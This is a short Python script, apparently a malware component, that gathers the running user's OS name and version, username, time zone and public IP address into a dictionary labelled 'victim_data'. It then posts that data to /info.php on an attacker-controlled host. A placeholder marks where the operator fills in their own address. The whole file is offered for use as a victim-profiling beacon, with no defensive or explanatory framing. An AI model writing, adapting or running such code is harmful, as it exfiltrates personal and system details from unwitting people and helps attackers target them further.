
import platform
import getpass
import time
import requests

# created by Ali Garivani

os_name = platform.uname()[0]
os_version = platform.uname()[2]
user_name = getpass.getuser()
time_zone = time.tzname[0]
ip = requests.get('https://api.ipify.org/').text

victim_data = {
    'OsName': os_name, 'TimeZone': time_zone, 'Ip': ip, 'OsVersion': os_version, "UserName": user_name
}
# change here :
address = ' /<>/<>/<>/ Enter Your Address Host For Send Victim Data /<>/<>/<>/ '
http = requests.post(f'{address}/info.php', data=victim_data)
